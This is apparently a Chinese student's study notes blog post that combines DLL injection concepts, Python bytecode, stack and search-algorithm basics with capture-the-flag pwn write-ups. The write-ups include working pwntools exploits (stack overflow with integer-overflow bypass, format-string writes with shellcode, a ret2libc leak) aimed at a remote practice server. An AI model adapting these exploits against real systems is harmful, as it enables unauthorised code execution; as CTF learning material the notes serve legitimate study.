---
title: 8.20--9.04
abbrlink: 17205
hidden: true
date: 2020-08-20 15:00:30
---

## DLL注入
DLL是一种模块共享和重用机制，可以被加载到其他进程中间执行。DLL注入目标进程不仅避免跨进程操作带来的繁琐过程，还可以直接执行自己的代码，进行hook、patch等操作   
### DLL注入方法
加载dll有三个时机：
1. 在进程创建阶段加载输入表中的dll（即静态输入）
2. 通过调用LoadLibrary(Ex)主动加载（动态加载）
3. 系统机制要求加载基础服务模块（如shell扩展模块、网络服务接口模块等）

#### 通过干预输入表处理过程加载目标dll
进程创建阶段会进行处理并加载输入表中的DLL模块。   
首先执行的是ntdll.dll中的函数，进行初始化，再加载输入表中的模块，并填充应用程序的IAT。因此只要输入表被处理前进行干预，为输入表增加一个项目，指向要加载的目标dll，或者替换原输入表中的dll，那么新进程的主线程在输入表初始化阶段就会主动加载目标dll    

#### 改变程序运行流程使其主动加载目标dll
程序运行的容器是进程，真正活动的是其中的线程。改变流程的做法通常是改变eip、创建新线程或修改目标进程内的代码，使其执行LoadLibrary(Ex)来加载目标dll


## python程序的执行过程
### 解释型语言和编译型语言
运行高级语言写成的程序时，需要通过*编译*或者*解释*，把高级语言转变成机器语言    
编译型语言在程序执行前，会通过编译器对代码进行编译，把代码变成机器语言的文件（如.exe），以后可以直接执行   
解释型语言把源代码翻译成中间代码，运行时再由解释器对中间代码进行解释运行

### PyCodeObject和pyc
python程序的**编译**结果位于PyCodeObject，当程序运行结束时解释器将PyCodeObject写到pyc文件中，程序第二次运行时，会在硬盘中寻找pyc文件，如果找到就可以直接载入。

>pyc文件是PyCodeObject在硬盘上的表现形式

python解释器只把可能重用到的模块持久化成pyc文件，并认为只有import进来的模块才是需要被重用的

### pyc
pyc文件也称为字节码文件     
一个pyc文件包含了：magic number、pyc文件创建时间、PyCodeObject   



参考：
1. https://www.cnblogs.com/guoyuanping/p/10524098.html
2. https://www.cnblogs.com/restran/p/4903056.html





## 逆向工程核心原理
### 栈
栈通常用于储存局部变量、传递函数参数、保存函数返回地址等    
栈由高地址向低地址扩展   


## 啊哈算法
### 深度优先搜索
基本模型：
```c++
void dfs(int step){
    判断边界;
    /*尝试每一种可能*/ for(i=1;i<=n;i++){

        /*下一步*/dfs(step+1)
    }
    return;
}
```
一直朝一边尝试，直到不通再返回尝试另一边。可以通过递归实现
### 广度优先搜索
记录每个点四周可以走到的点，并放进队列，判断完一个点后将点出队，直到达到“出口”



### int_overflow

用ida打开程序之后可以看到正常运行时的这几个函数    

其中login()里的buf和check_passwd()似乎有点问题。
在函数窗口还发现了一个函数“what_is_this”，打开之后发现这个函数执行之后直接"cat flag"了，应该就是我们栈溢出之后跳转的目标

看一下check的过程。先把s（即之前输入的buf）的长度赋给v3，检验v3的长度是否在3~8，然后最关键的来了：
>result = strcpy(&dest,s)

因此要做的就是在strcpy的时候把返回的地址覆盖为“what_is_this”的地址   
dest所在的栈长这样：
所以我们要从0x14一直覆盖到返回地址（共0x18个字节），然后把返回地址覆盖为0x0804868B   
“可是这样长度就超过8了哎...”   
我们注意到v3的类型是无符号int8，范围从0~2^8-1(即255)，而buf读入的长度为0x199（dec-409），可以通过整数溢出的方式，在返回地址后面再输入一些字符，使buf的长度在3~8之间

```py
from pwn import *
p = remote("220.249.52.133", 56818)
p.recv()
p.sendline("1")
p.recv()
p.sendline("111")
p.recv()
a = "1"*0x18 + p32(0x0804868B) + '1'* 232
p.sendline(a)
p.interactive()
```
[PWN——那些年坑过我们的数据类型](https://www.anquanke.com/post/id/173063)


### string
参考：
https://veritas501.space/2017/04/28/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/
http://blog.iyzyi.com/index.php/archives/557/#0x02CGfsb
https://introspelliam.github.io/2017/08/04/printf%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E/
```py
from pwn import *
context(os='linux',arch='amd64',log_level='debug')
p = remote("220.249.52.133", 30800)
p.recvuntil('secret[0] is ')
a = int(p.recvuntil('\n'), 16)
p.sendlineafter("character's name be:", 'aaa')
p.sendlineafter("up?:", "east")
p.sendlineafter("or leave(0)?:", '1')
p.sendlineafter("address", str(a))
# p.sendlineafter("And, you wish is:", 'aaaa'+'-%p'*10)
p.sendlineafter("And, you wish is:", '%85c%7$n')
# p.recvuntil('I hear it')
shellcode = asm(shellcraft.sh())
p.sendline(shellcode)
p.interactive()
```


### CGfsb

```py
from pwn import *
# context(os='linux',arch='amd64',log_level='debug')
p = remote("220.249.52.133", 49459)
p.recv()
p.sendline("111")
p.recv()
a = p32(0x0804A068) + '1111' + '%10$n'
p.sendline(a)
p.recv()
#a = "1"*0x228 + "1"*0x4 + p32(0x0804868B)
#p.sendline(a)
p.interactive()
```
参考：https://wiki.x10sec.org/pwn/fmtstr/fmtstr_exploit/

### cgpwn2


```py
from pwn import *
p = remote("220.249.52.133", 39614)
elf = ELF("level3")
p.recv()
a = '1'*0x88 + '4'*4 + p32(elf.plt['write']) + p32(0x0804844B) + p32(1) + p32(elf.got['write']) + p32(10)
p.sendline(a)
addr = u32(p.recv()[:4])
payload = '0'*0x8c + p32(addr-0x99a80) + '1'*4 + p32(addr+0x84c6b)
p.sendline(payload)
p.interactive()
```